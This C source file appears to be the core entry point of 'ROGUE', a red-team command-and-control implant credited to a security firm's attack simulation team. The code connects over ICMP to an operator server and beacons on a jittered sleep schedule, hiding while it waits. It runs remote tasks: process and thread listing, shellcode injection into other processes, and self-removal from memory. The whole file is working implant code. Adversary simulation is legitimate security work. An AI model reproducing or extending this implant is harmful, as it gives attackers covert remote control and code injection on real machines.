/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct __attribute__(( packed ))
{
	UINT32		AgentId;
} ROGUE_TASK_RES_NONE, *PROGUE_TASK_RES_NONE ;

typedef struct __attribute__(( packed ))
{
	UINT32		Ioctl;
	UINT32		TaskId;
	UINT32		Length;
	UINT8		Buffer[ 0 ];
} ROGUE_TASK_REQUEST, *PROGUE_TASK_REQUEST ;

typedef struct __attribute__(( packed ))
{
	UINT32		AgentId;
	UINT32		TaskId;
	BOOLEAN		TskErr;
	UINT32		WinErr;
	UINT8		Buffer[ 0 ];
} ROGUE_TASK_RESPONSE, *PROGUE_TASK_RESPONSE ;

/*!
 *
 * Purpose:
 *
 * Establishes a connection to the rogue_srv and
 * starts the command loop.
 *
 * Once the implant is instructed to exit, or is
 * not able to establish a connection, it will
 * free its allocations and itself from memory
 * before exiting the current thread.
 *
 * Is is recommended that rogue is run in its own
 * thread.
 *
!*/
D_SEC( B ) VOID WINAPI Entry( VOID )
{
	UINT32			Max = 0;
	UINT32			Min = 0;
	UINT32			Ext = 0;
	SIZE_T			Len = 0;
	BOOLEAN			Res = FALSE;

	PCONFIG			Cfg = NULL;
	PBUFFER			Out = NULL;
	PBUFFER			Rcv = NULL;
	PBUFFER			Snd = NULL;
	PROGUE_CTX		Ctx = NULL;
	PROGUE_TASK_REQUEST	Rtq = NULL;
	PROGUE_TASK_RES_NONE	Non = NULL;
	PROGUE_TASK_RESPONSE	Rtr = NULL;

	#if defined( _WIN64 )
	Cfg = C_PTR( U_PTR( GetIp() ) + 11 );
	#else
	Cfg = C_PTR( U_PTR( GetIp() ) + 10 );
	#endif

	/* Set the exit mode! */
	Ext = Cfg->ExitMode;

	/* Allocate a rogue context structure */
	Ctx = MemoryAlloc( sizeof( ROGUE_CTX ) );

	if ( Ctx != NULL ) {

		/* Set the established to FALSE */
		Ctx->Established = FALSE;

		/* Set the jitter percentage */
		Ctx->Config.JitterNum = Cfg->Jitter;

		/* Set the sleep time */
		Ctx->Config.SleepTime = Cfg->Sleep;

		/* Set the exit mode */
		Ctx->Config.ExitMode  = Cfg->ExitMode;

		/* Set the agent ID */
		Ctx->AgentId = RandomInt32();

		/* Is the agent ID greater than 0? */
		if ( Ctx->AgentId > 0 ) {
			/* Create the sending buffer */
			if ( ( Snd = BufferCreate() ) != NULL ) {
				/* Create the recv buffer */
				if ( BufferExtend( Snd, sizeof( ROGUE_TASK_RESPONSE ) ) ) {
					if ( Init( Ctx, Snd ) ) {
						/* Modify the response header */
						Rtr = C_PTR( Snd->Buffer );
						Rtr->AgentId = Ctx->AgentId;

						/* Create the response buffer */
						if ( ( Rcv = BufferCreate() ) != NULL ) {
							if ( IcmpSendRecv( Snd, Rcv ) ) {
								/* Do some further validation here! */
								Ctx->Established = TRUE;
							};
							/* Free the response buffer! */
							BufferClear( Rcv );
						};
					};
				};
				/* Clear the output buffer! */
				BufferClear( Snd );
			};
		};

		/* Did we establish a session? */
		while ( Ctx->Established != FALSE ) {
			/* Create the output buffer */
			if ( ( Snd = BufferCreate() ) != NULL ) {
				/* Extend to support the size of the buffer! */
				if ( BufferExtend( Snd, sizeof( ROGUE_TASK_RES_NONE ) ) ) {
					/* Set the agent ID! */
					Non = C_PTR( Snd->Buffer );
					Non->AgentId = Ctx->AgentId;

					/* Send to the listener! */
					if ( ( Rcv = BufferCreate() ) != NULL ) {
						/* Send the agent ID & get the response */
						if ( ( Ctx->Established = IcmpSendRecv( Snd, Rcv ) ) ) {
							Rtq = C_PTR( Rcv->Buffer );
							Len = Rcv->Length;

							while ( Len != 0 ) {
								if ( ( Out = BufferCreate() ) != NULL ) {
									/* Extend to support the response! */
									if ( BufferExtend( Out, sizeof( ROGUE_TASK_RESPONSE ) ) ) {
										/* What IOCTL was requested? */
										switch( Rtq->Ioctl ) {
											case IOCTL_PROC:
												/* List process's */
												Res = CtlProc( Ctx, Rtq->Length == 0 ? NULL : Rtq->Buffer, Rtq->Length, Out );
												break;
											case IOCTL_PROC_THREAD:
												/* List process threads */
												Res = CtlProcThread( Ctx, Rtq->Length == 0 ? NULL : Rtq->Buffer, Rtq->Length, Out );
												break;
											case IOCTL_EXIT:
												/* Exit rogue from memory */
												Res = CtlExit( Ctx, Rtq->Length == 0 ? NULL : Rtq->Buffer, Rtq->Length, Out );
												break;
											case IOCTL_INJECT:
												/* Inject a shellcode */
												Res = CtlInject( Ctx, Rtq->Length == 0 ? NULL : Rtq->Buffer, Rtq->Length, Out );
												break;
											default:
												/* Invalid IOCTL requested */
												NtCurrentTeb()->LastErrorValue = STATUS_INVALID_PARAMETER;
												Res = FALSE;
												break;
										};

										/* Set the packet header information */
										Rtr = C_PTR( Out->Buffer );
										Rtr->AgentId = Ctx->AgentId;
										Rtr->TaskId = Rtq->TaskId;
										Rtr->TskErr = Res;
										Rtr->WinErr = NtCurrentTeb()->LastErrorValue;

										/* Send the buffer back! */
										IcmpSendRecv( Out, NULL );
									};
									/* Clear the buffer ! */
									BufferClear( Out );
								};
								/* Subtract the request argumemt buffer and header size! */
								Len = Len - sizeof( ROGUE_TASK_REQUEST ) - Rtq->Length;
								Rtq = C_PTR( U_PTR( Rtq->Buffer ) + Rtq->Length );
							};
						};
						/* Free the buffer */
						BufferClear( Rcv );
					};
				};
				/* Free the buffer */
				BufferClear( Snd );
			};
			/* Is the connection still established? */
			if ( Ctx->Established != FALSE ) {
				if ( Ctx->Config.JitterNum != 0 ) {
					/* Calculate the minimum and maximum values of our jitter */
					Min = Ctx->Config.SleepTime - ( ( Ctx->Config.JitterNum * Ctx->Config.SleepTime ) / 100 );
					Max = Ctx->Config.SleepTime + ( ( Ctx->Config.JitterNum * Ctx->Config.SleepTime ) / 100 );
					
					/* Perform a sleep with a jitter! */
					Hide( RandomIntRng( Min, Max ) );
				} else {
					/* Perform a normal 'sleep' */
					Hide( Ctx->Config.SleepTime );
				};
			};
		};

		/* Set the exit mode! */
		Ext = Ctx->Config.ExitMode;

		/* Free the context structure */
		MemoryFree( Ctx );
	};
	/* Exits depending on the specified exit mode */
	Exit( Ext );
};
